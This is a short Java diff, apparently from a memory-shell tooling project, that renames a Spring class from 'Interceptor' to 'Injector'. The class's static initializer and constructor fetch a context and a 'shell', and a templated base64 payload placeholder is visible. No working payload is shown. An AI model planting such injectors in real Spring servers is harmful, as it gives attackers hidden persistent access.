@@ -14,10 +14,10 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  * @since 2024/12/22
  */
-public class SpringControllerHandlerInterceptor {
+public class SpringControllerHandlerInjector {
 
     static {
-        new SpringControllerHandlerInterceptor();
+        new SpringControllerHandlerInjector();
     }
 
     public String getUrlPattern() {
@@ -32,7 +32,7 @@ public class SpringControllerHandlerInterceptor {
         return "{{base64Str}}";
     }
 
-    public SpringControllerHandlerInterceptor() {
+    public SpringControllerHandlerInjector() {
         try {
             Object context = getContext();
             Object interceptor = getShell();
